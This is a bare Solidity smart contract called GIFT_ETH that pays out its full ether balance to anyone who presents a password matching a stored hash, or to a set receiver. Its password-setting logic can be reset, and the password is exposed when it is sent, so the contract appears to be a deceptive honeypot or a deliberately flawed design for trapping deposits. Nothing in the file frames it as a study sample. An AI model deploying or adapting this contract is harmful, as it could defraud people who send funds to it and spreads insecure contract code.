1 pragma solidity ^0.4.19;
2 
3 contract GIFT_ETH
4 {
5     function GetGift(bytes pass)
6     external
7     payable
8     {
9         if(hashPass == keccak256(pass))
10         {
11             msg.sender.transfer(this.balance);
12         }
13     }
14     
15     function GetGift()
16     public
17     payable
18     {
19         if(msg.sender==reciver)
20         {
21             msg.sender.transfer(this.balance);
22         }
23     }
24     
25     bytes32 hashPass;
26     
27     bool closed = false;
28     
29     address sender;
30     
31     address reciver;
32  
33     function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
34     
35     function SetPass(bytes32 hash)
36     public
37     payable
38     {
39         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
40         {
41             hashPass = hash;
42             sender = msg.sender;
43 
44         }
45     }
46    
47     function SetReciver(address _reciver)
48     public
49     {
50         if(msg.sender==sender)
51         {
52             reciver = _reciver;
53         }
54     }
55     
56     function PassHasBeenSet(bytes32 hash)
57     public
58     {
59         if(hash==hashPass&&msg.sender==sender)
60         {
61            closed=true;
62         }
63     }
64     
65     function() public payable{}
66     
67 }